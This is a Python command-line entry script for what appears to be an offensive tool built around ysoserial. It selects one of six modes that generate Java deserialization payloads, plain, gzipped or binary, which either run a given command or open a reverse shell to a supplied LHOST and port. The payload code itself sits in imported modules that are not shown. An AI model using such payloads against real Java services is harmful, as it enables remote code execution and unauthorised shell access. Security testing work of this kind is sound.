from src.lib import ysoserial
from interface.banner.exibe import banner
import argparse
from interface.menu import menu
from src.exec import Obj_Gzip,Obj_Normal,Reverse_Gzip,Reverse_Normal,Binary_cmd,Binary_rev
from interface.colors import VERDE,BRANCO,AMARELO, RED1,BLUE,VERMELHO

def args():


    parser = argparse.ArgumentParser(usage='main.py -h for help | -m 1 to 6 | -c command | -l LHOST | -p PORT', description= VERDE + 'Note: ' + BRANCO +'Reverse Mode required olny IP and PORT and Command Mode only the command' + BRANCO)
    parser.add_argument('-m', help=VERDE + 'Choose the mode 1,2,3,4,5,6' + BRANCO, required=True)
    parser.add_argument('-c', help=VERDE + 'Example: curl https://www.google.com' + BRANCO, required=False)
    parser.add_argument('-l', help=VERDE + 'LHOST/IP' + BRANCO, required=False)
    parser.add_argument('-p', help=VERDE + 'Port' + BRANCO, required=False)
    menu()


    args = parser.parse_args()


    mode = str(args.m)
    cmd = str(args.c)
    ip = str(args.l)
    port = str(args.p)
    


    if mode == '1':
       Obj_Gzip(cmd)
    elif mode == '2':
       Reverse_Gzip(ip,port)       
    elif mode == '3':
       Obj_Normal(cmd)       
    elif mode == '4':
       Reverse_Normal(ip,port)
    elif mode == '5':
       Binary_cmd(cmd)
    elif mode == '6':
       Binary_rev(ip,port)
    else:
        print('Invalid mode')

